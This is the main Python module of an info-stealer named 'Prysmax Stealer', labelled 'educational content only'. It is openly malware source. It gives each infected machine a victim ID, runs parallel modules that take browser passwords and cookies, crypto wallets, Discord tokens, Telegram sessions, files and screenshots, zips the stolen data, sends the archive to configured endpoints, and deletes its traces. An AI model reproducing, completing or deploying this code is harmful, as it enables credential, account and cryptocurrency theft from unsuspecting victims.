#!/usr/bin/env python3
"""
Prysmax Stealer - Main Module
Educational content only
"""

import os
import sys
import json
import time
import threading
import tempfile
import zipfile
from datetime import datetime
from pathlib import Path

# Import stealer modules
from .browsers import BrowserStealer
from .wallets import WalletStealer
from .discord import DiscordStealer
from .telegram import TelegramStealer
from .system import SystemInfo
from .files import FileStealer
from .screenshot import ScreenshotCapture
from .sender import LogSender

class PrysmaxStealer:
    def __init__(self, config_path="config/config.json"):
        self.config = self.load_config(config_path)
        self.temp_dir = tempfile.mkdtemp(prefix="prysmax_")
        self.victim_id = self.generate_victim_id()
        self.log_sender = LogSender(self.config)
        
    def load_config(self, config_path):
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            # Default configuration if file not found
            return {
                "stealer": {
                    "features": {
                        "passwords": True,
                        "cookies": True,
                        "tokens": True,
                        "wallets": True,
                        "files": True,
                        "screenshot": True,
                        "system_info": True
                    }
                }
            }
    
    def generate_victim_id(self):
        """Generate unique victim identifier"""
        import uuid
        import socket
        hostname = socket.gethostname()
        unique_id = str(uuid.uuid4())[:8]
        return f"{hostname}-{unique_id}"
    
    def run_stealer(self):
        """Main stealer execution function"""
        try:
            print(f"[PRYSMAX] Starting stealer for victim: {self.victim_id}")
            
            # Create victim directory
            victim_dir = os.path.join(self.temp_dir, self.victim_id)
            os.makedirs(victim_dir, exist_ok=True)
            
            # Initialize stealers
            stealers = []
            
            if self.config["stealer"]["features"].get("system_info", True):
                stealers.append(("System Info", SystemInfo(victim_dir)))
            
            if self.config["stealer"]["features"].get("passwords", True):
                stealers.append(("Browser Data", BrowserStealer(victim_dir)))
            
            if self.config["stealer"]["features"].get("wallets", True):
                stealers.append(("Crypto Wallets", WalletStealer(victim_dir)))
            
            if self.config["stealer"]["features"].get("tokens", True):
                stealers.append(("Discord Tokens", DiscordStealer(victim_dir)))
                stealers.append(("Telegram Sessions", TelegramStealer(victim_dir)))
            
            if self.config["stealer"]["features"].get("files", True):
                stealers.append(("File Stealer", FileStealer(victim_dir, self.config)))
            
            if self.config["stealer"]["features"].get("screenshot", True):
                stealers.append(("Screenshot", ScreenshotCapture(victim_dir)))
            
            # Execute stealers in parallel
            threads = []
            for name, stealer in stealers:
                thread = threading.Thread(target=self.execute_stealer, args=(name, stealer))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join(timeout=30)  # 30 second timeout per stealer
            
            # Create archive and send logs
            archive_path = self.create_archive(victim_dir)
            self.send_logs(archive_path)
            
            # Cleanup
            self.cleanup()
            
        except Exception as e:
            print(f"[PRYSMAX] Error in main stealer: {e}")
    
    def execute_stealer(self, name, stealer):
        """Execute individual stealer module"""
        try:
            print(f"[PRYSMAX] Executing {name}")
            stealer.steal()
            print(f"[PRYSMAX] Completed {name}")
        except Exception as e:
            print(f"[PRYSMAX] Error in {name}: {e}")
    
    def create_archive(self, victim_dir):
        """Create ZIP archive of stolen data"""
        try:
            archive_path = os.path.join(self.temp_dir, f"Prysmax-{self.victim_id}.zip")
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(victim_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_name = os.path.relpath(file_path, victim_dir)
                        zipf.write(file_path, arc_name)
            
            return archive_path
        except Exception as e:
            print(f"[PRYSMAX] Error creating archive: {e}")
            return None
    
    def send_logs(self, archive_path):
        """Send logs to configured endpoints"""
        if archive_path and os.path.exists(archive_path):
            self.log_sender.send_archive(archive_path, self.victim_id)
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except Exception as e:
            print(f"[PRYSMAX] Cleanup error: {e}")

def main():
    """Main entry point"""
    try:
        stealer = PrysmaxStealer()
        stealer.run_stealer()
    except Exception as e:
        print(f"[PRYSMAX] Fatal error: {e}")

if __name__ == "__main__":
    main()

